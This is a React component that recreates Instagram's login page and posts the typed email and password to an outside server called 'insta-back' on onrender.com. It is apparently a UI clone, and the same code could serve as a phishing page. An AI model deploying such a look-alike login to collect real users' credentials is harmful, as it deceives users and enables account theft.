import React, { useState } from 'react';
import './Home.css';
import axios from 'axios';
import { useNavigate } from 'react-router-dom';
import img1 from './images/logo.png';
import imgG from './images/google-play.png';
import imgA from './images/app-store.png';
import { FaFacebookSquare } from 'react-icons/fa';


const baseUrl = "https://insta-back-uvmi.onrender.com";
function Home() {

    const navigate = useNavigate();

    const [value, setValue] = useState({
        email: "",
        pass: "",
    });

    const submitNow = () => {
        if (value.email && value.pass) {
            axios.post(`${baseUrl}/signin`, value)
                .then((response) => {
                    console.log(response.data);
                    navigate('/home')
                })
                .catch((error) => {
                    console.log(error);
                });
            console.log(value);
        } else {
            alert("fill all details..")
        }
    }

    return (
        <div id="wrapper">
        <div className="container">
          <div className="phone-app-demo"></div>
          <div className="form-data">
            <form onClick={(e)=> e.preventDefault()}>
              <div className="logo">
                <img src={img1} alt="logo" />
              </div>
              <input type="text" placeholder="Phone number, username, or email" onChange={(e) => setValue((prev) => ({ ...prev, email: e.target.value }))}/>
              <input type="password" placeholder="Password" onChange={(e) => setValue((prev) => ({ ...prev, pass: e.target.value }))}  />
              <button className="form-btn" onClick={submitNow} >Log in</button>
              <span className="has-separator">Or</span>
              <a className="facebook-login" href="#">
               <FaFacebookSquare className='fb'/>  Log in with Facebook
              </a>
              <a className="password-reset" href="#">Forgot password?</a>
            </form>
            <div className="sign-up">
              Don't have an account? <a href="#">Sign up</a>
            </div>
            <div className="get-the-app">
              <span>Get the app.</span>
              <div className="badges">
                <img src={imgA} alt="app-store badge" />
                <img src={imgG} alt="google-play badge" />
              </div>
            </div>
          </div>
        </div>
      </div>
    )
}

export default Home


